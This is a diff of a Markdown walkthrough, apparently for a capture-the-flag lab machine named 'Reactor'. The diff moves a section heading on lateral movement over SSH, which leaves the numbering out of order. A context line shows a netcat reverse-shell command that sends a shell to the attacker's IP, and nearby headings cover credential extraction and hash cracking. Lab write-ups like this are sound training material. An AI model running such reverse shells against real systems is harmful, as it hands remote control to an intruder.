@@ -1116,6 +1116,17 @@ busybox nc <YOUR_IP> 4444 -e /bin/sh
 <br>
 </div>
 
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+</div>
+<!-- PAGE BREAK -->
+<div style="page-break-after: always;"></div>
+
+## 4. Lateral Movement — SSH as engineer
+
 ##### 3.2.2 Database Credential Extraction
 
 Once the shell connects, query the DB(`reactor.db`) we found:
@@ -1206,13 +1217,7 @@ Look at where you found this hash in the "Reactor" machine. The source tells you
 <div align="center">
 <br>
 <br>
-※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
-<br>
 </div>
-<!-- PAGE BREAK -->
-<div style="page-break-after: always;"></div>
-
-## 4. Lateral Movement — SSH as engineer
 
 ### 4.1 Hash Cracking
 
